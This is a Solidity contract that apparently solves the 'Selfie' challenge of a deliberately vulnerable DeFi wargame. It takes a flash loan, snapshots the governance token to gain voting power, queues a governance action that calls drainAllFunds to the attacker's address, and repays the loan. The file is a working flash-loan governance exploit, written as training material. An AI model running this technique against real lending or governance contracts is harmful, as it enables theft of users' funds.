// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

contract SelfieAttacker is IReceiver {
    SelfiePool public lendingPool;
    SimpleGovernance public simpleGovernance;
    address public attacker;
    uint256 public actionId;

    constructor(address poolAddress, address governanceAddress, address _attacker) {
        lendingPool = SelfiePool(poolAddress);
        simpleGovernance = SimpleGovernance(governanceAddress);
        attacker = _attacker;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = simpleGovernance.queueAction(address(lendingPool), data, 0);
        //return dvt
        token.transfer(address(lendingPool), amount);
    }

    function attack(uint256 amount) external {
        lendingPool.flashLoan(amount);
    }
}
